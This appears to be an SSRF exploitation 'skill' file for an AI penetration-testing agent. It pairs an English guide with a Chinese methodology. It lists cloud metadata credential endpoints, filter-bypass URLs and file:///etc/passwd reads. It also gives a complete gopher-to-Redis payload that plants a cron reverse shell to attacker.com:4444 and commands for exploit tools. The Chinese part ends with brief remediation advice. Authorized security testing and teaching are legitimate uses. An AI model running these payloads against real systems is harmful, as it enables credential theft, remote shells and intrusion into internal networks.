---
name: ssrf-testing
description: SSRF testing for cloud metadata access, internal service discovery, and protocol smuggling
---

# Ssrf Testing

> **penkit51 AI** — professional penetration testing skill pack. Authorized testing only.

## Deep Exploitation Guide

# SSRF

Server-Side Request Forgery enables the server to reach networks and services the attacker cannot. Focus on cloud metadata endpoints, service meshes, Kubernetes, and protocol abuse to turn a single fetch into credentials, lateral movement, and sometimes RCE.

## Attack Surface

**Scope**
- Outbound HTTP/HTTPS fetchers (proxies, previewers, importers, webhook testers)
- Non-HTTP protocols via URL handlers (gopher, dict, file, ftp, smb wrappers)
- Service-to-service hops through gateways and sidecars (envoy/nginx)
- Cloud and platform metadata endpoints, instance services, and control planes

**Direct URL Params**
- `url=`, `link=`, `fetch=`, `src=`, `webhook=`, `avatar=`, `image=`

**Indirect Sources**
- Open Graph/link previews, PDF/image renderers
- Server-side analytics (Referer trackers), import/export jobs
- Webhooks/callback verifiers

**Protocol-Translating Services**
- PDF via wkhtmltopdf/Chrome headless, image pipelines
- Document parsers, SSO validators, archive expanders

**Less Obvious**
- GraphQL resolvers that fetch by URL
- Background crawlers, repository/package managers (git, npm, pip)
- Calendar (ICS) fetchers

## High-Value Targets

### AWS

- IMDSv1: `http://169.254.169.254/latest/meta-data/` → `/iam/security-credentials/{role}`, `/user-data`
- IMDSv2: requires token via PUT `/latest/api/token` with header `X-aws-ec2-metadata-token-ttl-seconds`, then include `X-aws-ec2-metadata-token` on subsequent GETs
- If sink cannot set headers or methods, seek intermediaries that can
- ECS/EKS task credentials: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`

### GCP

- Endpoint: `http://metadata.google.internal/computeMetadata/v1/`
- Required header: `Metadata-Flavor: Google`
- Target: `/instance/service-accounts/default/token`

### Azure

- Endpoint: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- Required header: `Metadata: true`
- MSI OAuth: `/metadata/identity/oauth2/token`

### Kubernetes

- Kubelet: 10250 (authenticated) and 10255 (deprecated read-only)
- Probe `/pods`, `/metrics`, exec/attach endpoints
- API server: `https://kubernetes.default.svc/`
- Authorization often needs service account token; SSRF that propagates headers/cookies may reuse them
- Service discovery: attempt cluster DNS names (`svc.cluster.local`) and default services (kube-dns, metrics-server)

### Internal Services

- Docker API: `http://localhost:2375/v1.24/containers/json` (no TLS variants often internal-only)
- Redis/Memcached: `dict://localhost:11211/stat`, gopher payloads to Redis on 6379
- Elasticsearch/OpenSearch: `http://localhost:9200/_cat/indices`
- Message brokers/admin UIs: RabbitMQ, Kafka REST, Celery/Flower, Jenkins crumb APIs
- FastCGI/PHP-FPM: `gopher://localhost:9000/` (craft records for file write/exec when app routes to FPM)

## Key Vulnerabilities

### Protocol Exploitation

**Gopher**
- Speak raw text protocols (Redis/SMTP/IMAP/HTTP/FCGI)
- Use to craft multi-line payloads, schedule cron via Redis, or build FastCGI requests

**File and Wrappers**
- `file:///etc/passwd`, `file:///proc/self/environ` when libraries allow file handlers
- `jar:`, `netdoc:`, `smb://` and language-specific wrappers (`php://`, `expect://`) where enabled

### Address Variants

- Loopback: `127.0.0.1`, `127.1`, `2130706433`, `0x7f000001`, `::1`, `[::ffff:127.0.0.1]`
- RFC1918/link-local: 10/8, 172.16/12, 192.168/16, 169.254/16
- Test IPv6-mapped and mixed-notation forms

### URL Confusion

- Userinfo and fragments: `http://internal@attacker/` or `http://attacker#@internal/`
- Scheme-less/relative forms the server might complete internally: `//169.254.169.254/`
- Trailing dots and mixed case: `internal.` vs `INTERNAL`, Unicode dot lookalikes

### Redirect Abuse

- Allowlist only applied pre-redirect: 302 from attacker → internal host
- Test multi-hop and protocol switches (http→file/gopher via custom clients)

### Header and Method Control

- Some sinks reflect or allow CRLF-injection into the request line/headers
- If arbitrary headers/methods are possible, IMDSv2, GCP, and Azure become reachable

## Bypass Techniques

**Address Encoding**
- Decimal, hex, octal representations of IP addresses
- IPv6 variants, IPv4-mapped IPv6, mixed notation

**DNS Rebinding**
- First resolution returns allowed IP, second returns internal target
- Use short TTL DNS records under attacker control

**URL Parser Differentials**
- Different parsing between allowlist checker and actual fetcher
- Exploit inconsistencies in scheme, host, port, path handling

**Redirect Chains**
- Initial URL passes allowlist, redirect targets internal host
- Protocol downgrade/upgrade through redirects

## Blind SSRF

- Use OAST (DNS/HTTP) to confirm egress. `interactsh-client -v` (running
  in the sandbox) gives you a unique `*.oast.fun` domain; embed it in
  the URL parameter and watch the interactsh stdout for the inbound
  DNS/HTTP hit. Each invocation yields a fresh domain — restart between
  payloads if you need to correlate hits to a specific request.
- Derive internal reachability from timing, response size, TLS errors, and ETag differences
- Build a port map by binary searching timeouts (short connect/read timeouts yield cleaner diffs)

## Chaining Attacks

- SSRF → Metadata creds → cloud API access (list buckets, read secrets)
- SSRF → Redis/FCGI/Docker → file write/command execution → shell
- SSRF → Kubelet/API → pod list/logs → token/secret discovery → lateral movement

## Testing Methodology

1. **Identify surfaces** - Every user-influenced URL/host/path across web/mobile/API and background jobs
2. **Establish oracle** - Quiet OAST DNS/HTTP callbacks first
3. **Internal addressing** - Pivot to loopback, RFC1918, link-local, IPv6, hostnames
4. **Protocol variations** - Test gopher, file, dict where supported
5. **Parser differentials** - Test across frameworks, CDNs, and language libraries
6. **Redirect behavior** - Single-hop, multi-hop, protocol switches
7. **Header/method control** - Can you influence request headers or HTTP method?
8. **High-value targets** - Metadata, kubelet, Redis, FastCGI, Docker, Vault, internal admin panels

## Validation

1. Prove an outbound server-initiated request occurred (OAST interaction or internal-only response differences)
2. Show access to non-public resources (metadata, internal admin, service ports) from the vulnerable service
3. Where possible, demonstrate minimal-impact credential access (short-lived token) or a harmless internal data read
4. Confirm reproducibility and document request parameters that control scheme/host/headers/method and redirect behavior

## False Positives

- Client-side fetches only (no server request)
- Strict allowlists with DNS pinning and no redirect following
- SSRF simulators/mocks returning canned responses without real egress
- Blocked egress confirmed by uniform errors across all targets and protocols
- OAST callbacks where the source IP matches the tester's machine, not the server — the browser or a client-side fetch made the request, not the backend

## Impact

- Cloud credential disclosure with subsequent control-plane/API access
- Access to internal control panels and data stores not exposed publicly
- Lateral movement into Kubernetes, service meshes, and CI/CD
- RCE via protocol abuse (FCGI, Redis), Docker daemon access, or scriptable admin interfaces

## Pro Tips

1. Prefer OAST callbacks first; then iterate on internal addressing and protocols
2. Test IPv6 and mixed-notation addresses; filters often ignore them
3. Observe library/client differences (curl, Java HttpClient, Node, Go); behavior changes across services and jobs
4. Redirects are leverage: control both the initial allowlisted host and the next hop
5. Metadata endpoints require headers/methods; verify if your sink can set them or if intermediaries add them
6. Use tiny payloads and tight timeouts to map ports with minimal noise
7. When responses are masked, diff length/ETag/status and TLS error classes to infer reachability
8. Chain quickly to durable impact (short-lived tokens, harmless internal reads) and stop there

## Summary

Any feature that fetches remote content on behalf of a user is a potential tunnel to internal networks and control planes. Bind scheme/host/port/headers explicitly or expect an attacker to route through them.

## Platform Methodology

# SSRF服务器端请求伪造测试

## 概述

SSRF（Server-Side Request Forgery）是一种利用服务器发起请求的漏洞，可以访问内网资源、进行端口扫描或绕过防火墙。本技能提供SSRF漏洞的检测、利用和防护方法。

## 漏洞原理

应用程序接受URL参数并请求该URL，攻击者可以控制请求的目标，导致：
- 内网资源访问
- 本地文件读取
- 端口扫描
- 绕过防火墙
- 云服务元数据访问

## 测试方法

### 1. 识别SSRF输入点

**常见功能：**
- URL预览/截图
- 文件上传（远程URL）
- Webhook回调
- API代理
- 数据导入
- 图片处理
- PDF生成

### 2. 基础检测

**测试本地回环：**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**测试内网IP：**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**测试文件协议：**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. 绕过技术

**IP地址编码：**
```
127.0.0.1 → 2130706433 (十进制)
127.0.0.1 → 0x7f000001 (十六进制)
127.0.0.1 → 0177.0.0.1 (八进制)
```

**域名解析绕过：**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
localtest.me
```

**URL重定向：**
```
http://attacker.com/redirect → http://127.0.0.1
```

**协议混淆：**
```
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

## 利用技术

### 内网探测

**端口扫描：**
```bash
# 使用Burp Intruder
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**识别服务：**
- 响应时间差异
- 错误信息
- HTTP状态码
- 响应内容

### 云服务元数据

**AWS EC2：**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Google Cloud：**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure：**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**阿里云：**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### 内网应用攻击

**访问管理后台：**
```
http://127.0.0.1:8080/admin
http://192.168.1.100/phpmyadmin
```

**Redis未授权访问：**
```
http://127.0.0.1:6379
# 然后发送Redis命令
```

**FastCGI攻击：**
```
http://127.0.0.1:9000
# 利用FastCGI协议执行命令
```

## 高级利用

### Gopher协议

**发送任意协议数据：**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
```

**Redis命令执行：**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Dict协议

**端口扫描和信息收集：**
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

### 文件协议

**读取本地文件：**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## 工具使用

### SSRFmap

```bash
# 基础扫描
python3 ssrfmap.py -r request.txt -p url

# 端口扫描
python3 ssrfmap.py -r request.txt -p url -m portscan

# 云元数据
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus

```bash
# 生成Gopher payload
python gopherus.py --exploit redis
```

### Burp Collaborator

**检测盲SSRF：**
```
http://burpcollaborator.net
# 观察是否有DNS/HTTP请求
```

## 验证和报告

### 验证步骤

1. 确认可以控制请求目标
2. 验证内网资源访问或端口扫描
3. 评估影响范围（内网渗透、数据泄露等）
4. 记录完整的POC

### 报告要点

- 漏洞位置和输入参数
- 可访问的内网资源或端口
- 完整的利用步骤和PoC
- 修复建议（URL白名单、禁用危险协议等）

## 防护措施

### 推荐方案

1. **URL白名单**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   parsed = urlparse(url)
   if parsed.netloc not in ALLOWED_DOMAINS:
       raise ValueError("Domain not allowed")
   ```

2. **禁用危险协议**
   - 只允许http/https
   - 禁止file://、gopher://、dict://等

3. **IP地址过滤**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       return ipaddress.ip_address(ip).is_private or \
              ipaddress.ip_address(ip).is_loopback
   ```

4. **使用DNS解析验证**
   - 解析域名获取IP
   - 验证IP是否在内网范围

5. **网络隔离**
   - 限制服务器出网权限
   - 使用代理服务器

## 注意事项

- 仅在授权测试环境中进行
- 避免对内网系统造成影响
- 注意不同协议的支持情况
- 测试时注意请求频率，避免触发防护

## Validation & Reporting

- Confirm every finding with reproducible PoC before reporting
- Document: severity (CVSS), affected asset, steps, evidence, remediation
- Use `record_vulnerability` when running inside the penkit51 platform
- Chain low-severity findings into higher-impact attack paths
- Never report without evidence — distinguish hypothesis from confirmed vuln

